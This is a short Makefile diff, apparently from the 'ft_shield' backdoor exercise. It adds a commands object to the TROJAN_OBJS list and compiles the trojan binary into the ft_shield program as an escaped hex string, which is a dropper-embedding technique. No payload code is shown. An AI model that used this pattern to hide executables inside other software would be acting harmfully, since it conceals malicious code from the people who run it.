@@ -19,6 +19,7 @@ TROJAN_OBJS = $(addprefix o/,\
 			  trojan.o\
 			  lock.o\
 			  socket.o\
+			  commands.o\
 			  )
 
 VPATH = $(wildcard s/*/) s/
@@ -38,7 +39,7 @@ o/%.o: %.c | o
 	$(CC) $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)
 
 .ONESHELL:
-o/ft_shield.o: s/ft_shield.c
+o/ft_shield.o: s/ft_shield.c $(TROJAN_OBJS)
 	code=$$($(XXD) -c0 -p < $(TROJAN) | sed 's/../\\x&/g')
 	$(CC) -DTROEXE=\"$$code\" $(CPPFLAGS) $(CFLAGS) $< -c -o o/$(notdir $@)
 
